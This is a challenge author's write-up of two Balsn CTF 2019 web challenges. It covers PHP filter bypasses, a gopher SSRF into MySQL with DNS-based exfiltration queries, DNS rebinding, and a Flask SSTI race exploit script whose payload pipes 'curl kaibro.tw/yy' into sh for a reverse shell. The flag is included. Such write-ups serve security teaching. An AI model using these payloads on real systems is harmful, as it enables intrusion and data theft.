# Balsn CTF 2019 

[中文版 Chinese Version](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2019/README_tw.md)

# Warmup

- Difficulty: ★★
- Type: Web
- Solved: 5 / 720
- Tag: PHP, SSRF, MySQL, Windows

## Description

Baby PHP challenge again.

![](https://i.imgur.com/jIk1rJT.jpg)

[Link](http://warmup.balsnctf.com)


## Source Code

- [Warmup](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2019/Warmup/index.php)

## Solution

This challenge consists of many simple and old PHP/Windows tricks.


### Step 1

In this challenge, you should refactor the code first. 
(Because the source code is so ugly and hard to read :p)

After refactoring, you will get the clean code like this:

```php
<?php
    // This is the meme image location
    $secret = base64_decode(str_rot13("CTygMlOmpz"."Z9VaSkYzcjMJpvCt=="));

    highlight_file(__FILE__);

    include("config.php");
    
    $op = @$_GET['op'];
    
    if(@strlen($op) < 3 && @($op + 8) < 'A_A') {
    
        $_ = @$_GET['Σ>―(#°ω°#)♡→'];
    
        if( preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i',$_) || @strlen(count_chars(strtolower($_), 0x3)) > 0xd || @strlen($_) > 19 )
            exit($secret);
        
        $ch = curl_init());
        @curl_setopt($ch, CURLOPT_URL, 
                str_replace("%33%33%61", ">__<", 
                str_replace("%63%3a", "WTF", str_replace("633a", ":)", 
                str_repLace("433a", ":(", 
                str_replace("\x63:", "ggininder", 
                strtolower(
                    eval("return $_;")
                ))))))
        );
        @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        @curl_setopt($ch, CURLOPT_TIMEOUT, 1);
        @curl_EXEC($ch);
        
    } else {
    
        if(@stRLEn($op) < 4 && @($op + 78) < 'A__A') {
        
            // There is a invisible character here. (\xe2\x81\xa3)
            $_ = @$_GET['⁣'];
        
            if((strtolower(substr($_, -4)) === '.php') || 
               (strtolower(substr($_, -4)) === 'php.') || 
               (stripos($_, "\"") !== FALSE) || 
               (stripos($_, "\x3e") !== FALSE) || 
               (stripos($_,"\x3c") !== FALSE) || 
               (stripos(strtolower($_), "amp") !== FALSE))
                    die($secret);
        
            if(stripos($_, "..") !== FALSE)
                die($secret);
            
            if(stripos($_, "\x24") !== FALSE)
                die($secret);
            
            print_r(substr(@file_get_contents($_), 0, 155));
            
        } else {
        
            die($secret);

            // It is useless, because there is a die function before it. :D
            system($_GET[0x9487945]);
            
        }
    }
```

<br>

### Step 2

Let's try to read the `config.php`

There are two methods:

1. use the `file_get_contents()` (Intended)
2. use the `eval()` (Unintended)

<br>

**Method 0x1**

`if(@stRLEn($op) < 4 && @($op + 78) < 'A__A')`

For this if condition, we can simply use `op=-99` to pass it.

After that, we can input our filename for `file_get_contents()` here:

`$_ = @$_GET['⁣'];`

The argument of the `$_GET` is `\xE2\x81\xA3`, it is an invisible character.

<br>

Our target is to read `config.php`, but there is some check for our filename:

We can't use the `.php`, `php.` filename suffix and we can't use `"`, `>`, `<`, `amp`, `$`, `..` in the filename.

To bypass this restriction to read the php source code, you just need to append a space character after the filename:

`config.php[SPACE]`

(Because the server is running on Windows, there are some weird path normalization rule here :p)

<br>

If you try to read the source code of `config.php` like this:

`http://warmup.balsnctf.com/?op=-99&%E2%81%A3=config.php%20`

You will get the partial content of `config.php`:

```php
<?php
    // ***********************************
    // THIS IS THE CONFIG OF THE MYSQL DB
    // ***********************************
    $host = "loca
```

Because the third argument of `file_get_contents()` is 155. (Read 155 Bytes only)

<br>

We should use some special php wrapper to compress the content of `config.php` first.

And `php://filter/zlib.deflate` is your best friend!

Use `zlib.deflate` to compress the content and then decompress it by using `zlib.inflate`.

Script:

```php
<?php
$a = file_get_contents("http://warmup.balsnctf.com/?op=-99&%E2%81%A3=php://filter/zlib.deflate/resource=config.php%20");
$idx = stripos($a, "</code>") + 7;
file_put_contents("/tmp/tmp", substr($a, $idx));

echo (file_get_contents("php://filter/zlib.inflate/resource=/tmp/tmp"));
```

Now you have the `config.php`: 

```php
<?php
    // ***********************************
    // THIS IS THE CONFIG OF THE MYSQL DB
    // ***********************************
    $host = "localhost";
    $user = "admin";
    $pass = "";
    $port = 8787;
    // hint:flag-is-in-the-database XDDDDDDD
    // ====================================
```

<br>

**Method 0x2**

Many teams use the `eval()` of the first branch to read `config.php`. 

In this `eval()` branch, your input `$_` will put into `eval("return $_;")`.

Here is a strict regex rule to check our input.

```php
if( preg_match('/[\x00-!\'0-9"`&$.,|^[{_zdxfegavpos\x7F]+/i',$_) || @strlen(count_chars(strtolower($_), 0x3)) > 0xd || @strlen($_) > 19 )
    exit($secret);
```

But we can use `~` operator to bypass many restrictions.

Example: `~urldecode("%8D%9A%9E%9B%99%96%93%9A")` is equal to `readfile`.

<br>

In Windows, there are some **MAGIC** wildcard features for path normalization.

Example: 

`>` will match one arbitrary character. (like `?` on Linux) 

`<` will match zero or more arbitrary characters. (like `*` on Linux)

(more detail: [My-CTF-CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet#%E8%B7%AF%E5%BE%91%E6%AD%A3%E8%A6%8F%E5%8C%96))

Combine the `~` trick and `<` trick together:

`/?op=-9&Σ>―(%23°ω°%23)♡→=(~%8D%9A%9E%9B%99%96%93%9A)(~%9C%90%C3%C3)`

(It is same as `readfile("co<<")`)

<br>

### Step 3

The content of `config.php` tells us that the flag is in the MySQL database.
Our next target is to query MySQL Server and get the result.

And we know the user is `admin` with empty password, so we can use `gopher://` protocol to  SSRF to query the MySQL Server.

<br>

Since the gopher payload is toooooo long, we should find a way to bypass the strict regex rule first.

If you try to search all PHP functions that satisfy the regex rule and length limit, you will find a useful function: `getenv()`.
This function will return the specifying header value.

Hence, we can put our gopher payload into the HTTP header:

`(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%AB)` (length: 18)

It is equal to `getenv("HTTP_T")`.

<br>

### Step 4

Now, you have a blind SSRF!

For the MySQL protocol, you can use some tools like [Gopherus](https://github.com/tarunkant/Gopherus) to create the gopher payload.

At last, you just need to use Time-based or Out-of-band (DNS log) methods to exfiltrate the query result.

- `select load_file(concat("\\\\",table_name,".e222e6f24ba81a9b414f.d.zhack.ca/a")) from information_schema.tables where table_schema="ThisIsTheDbName";`
    - Output: `fl4ggg`
- `select load_file(concat("\\\\",column_name,".e222e6f24ba81a9b414f.d.zhack.ca/a")) from information_schema.columns where table_name="fl4ggg";`
    - Output: `the_flag_col`
- `select load_file(concat("\\\\",hex(the_flag_col),".e222e6f24ba81a9b414f.d.zhack.ca/a")) from ThisIsTheDbName.fl4ggg;`
    - Output: `42616C736E7B337A5F77316E643077735F7068705F6368346C7D`
    - hex to ascii: `Balsn{3z_w1nd0ws_php_ch4l}`


## Writeups

- [movrment's writeup](https://movrment.blogspot.com/2019/10/balsn-ctf-2019-web-warmup.html)
- [ljdd520's writeup](https://ljdd520.github.io/2019/12/19/2019balsnCTF%E7%9A%84Warmup%E5%92%8Ckoreanfish%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/)

---

<br>

# 卍乂Oo韓國魚oO乂卍 (Koreanfish)


- Difficulty: ★
- Type: Web
- Solved: 15 / 720
- Tag: PHP, DNS Rebinding, Flask, Race condition, SSTI, RCE

## Description

Taiwanese people love korean fish.

[Server Link](http://koreanfish.balsnctf.com/)

[Download](https://static.balsnctf.com/koreafish/d68fcc656a04423422ff162d9793606f2c5068904fced9087edc28efc411e7b7/koreafish-src.zip)

## Source Code

- [Koreanfish](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2019/Koreanfish/)

## Solution

This is a white-box challenge, and all the source code are very short and simple :D

<br>

### Step 1

If you look at the source code of `index.php`, you will know the first target is to bypass IP limit.

Actually, here is a obvious DNS Rebinding vulnerability that can bypass IP limit:

```
$ip = @dns_get_record($res['host'], DNS_A)[0]['ip'];
...
$dev_ip = "54.87.54.87";
if($ip === $dev_ip) {
    $content = file_get_contents($dst);
```

The `file_get_contents()` will query DNS again and read the response.

If we set our domain's A record to `54.87.54.87` and `127.0.0.1`, it has some possibilities to bypass IP restriction to query internal services.

If you don't have any domain ... 

Don't worry! 

You can use some online DNS Rebinding services like `rbndr.us`.

e.g. `36573657.7f000001.rbndr.us` will return `54.87.54.87` or `127.0.0.1`.

<br>

### Step 2

From the dockerfile, we know there is a simple flask app running on the same server.

And there is a obvious SSTI vulnerability on `/error_page` function, it uses `render_template_string()` with controllable content.

<br>

If the `error_status` set to absolute path, then the return path of `os.path.join()` will be overwritten.

e.g. `os.path.join("/var/www/flask", "error", "/etc/passwd")` will return `/etc/passwd`

<br>

But the problem here is that you can't directly touch this `/error_page`.

Because the front-end php will check the query path, the path has to contain the string of `korea`:

`if(stripos($res['path'], "korea") === FALSE) die("Error");`

<br>

There are two ways that can bypass this path restriction:

<br>

**Method 0x1**

You can use redirect!

Using DNS Rebinding to your Server IP, Then set the path `/korea` to redirect to `127.0.0.1:5000/error_page?err=....`.

The reason is that `file_get_contents()` will follow the 302 redirect.

<br>

**Method 0x2**

Using Flask's special feature!

In the flask app, `//korea/ping` is equal to `/ping`.

Therefore, you can just use `//korea/error_page?err=....` to bypass the restriction.

<br>

### Step 3

Now, we can control the path of the content that `render_template_string()` read.

You should find a file that can be placed our controllable payload.

Because the server is running with PHP, you can use the `session.upload_progress` trick to upload your SSTI payload to the session file.

If you provide the `PHP_SESSION_UPLOAD_PROGRESS` in the multipart POST data, PHP will enable the session for you.

(The concept is same as HITCON CTF 2018 - one line php challenge: [Link](https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html).)

(Note: your payload couldn't contain `|`, because that will break the session content format.)

<br>

### Step 4

The default `session.upload_progress.cleanup` setting is `On`, so your SSTI payload will be cleaned quickly.

OK! Let's Race it!

Exploit script:

```python
import sys
import string
import requests
from base64 import b64encode
from random import sample, randint
from multiprocessing.dummy import Pool as ThreadPool

HOST = 'http://koreanfish4.balsnctf.com/index.php'
sess_name = 'iamkaibro'

headers = {
    'Connection': 'close', 
    'Cookie': 'PHPSESSID=' + sess_name
}

payload = """
{% for c in []['__class__']['__base__']['__subclasses__']() %}
{% if c['__name__'] == 'catch_warnings' %}
{% for b in c['__init__']['__globals__']['values']() %}
{% if b['__class__']=={}['__class__'] %}
{% if 'eval' in b['keys']() %}
{% if b['eval']('__import__("os")\\x2epopen("curl kaibro\\x2etw/yy\\x7csh")') %}{% endif %}
{% endif %}
{% endif %}
{% endfor %}
{% endif %}
{% endfor %}
"""

def runner1(i):
    data = {
        'PHP_SESSION_UPLOAD_PROGRESS': payload
    }
    while 1:
        fp = open('/etc/passwd', 'rb')
        r = requests.post(HOST, files={'f': fp}, data=data, headers=headers)
        fp.close()

def runner2(i):
    filename = '/var/lib/php/sessions/sess_' + sess_name
    # print filename
    while 1:
        url = '{}?%F0%9F%87%B0%F0%9F%87%B7%F0%9F%90%9F=http://36573657.7f000001.rbndr.us:5000//korea/error_page%3Ferr={}'.format(HOST, filename)
        r = requests.get(url, headers=headers)
        c = r.content
        print [c]

if sys.argv[1] == '1':
    runner = runner1
else:
    runner = runner2

pool = ThreadPool(32)
result = pool.map_async( runner, range(32) ).get(0xffff)
```

Have a cup of coffee, then you'll see the reverse shell back. :D

For the detail of bypassing the SSTI sanitizing, you can read my cheatsheet: [Link](https://github.com/w181496/Web-CTF-Cheatsheet#flaskjinja2) 

## Writeups

- [tr1ple's writeup](https://www.cnblogs.com/tr1ple/p/11682014.html#xwrEKctS)
- [ljdd520's writeup](https://ljdd520.github.io/2019/12/19/2019balsnCTF%E7%9A%84Warmup%E5%92%8Ckoreanfish%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/)
---

Hope you like these challenges. :p
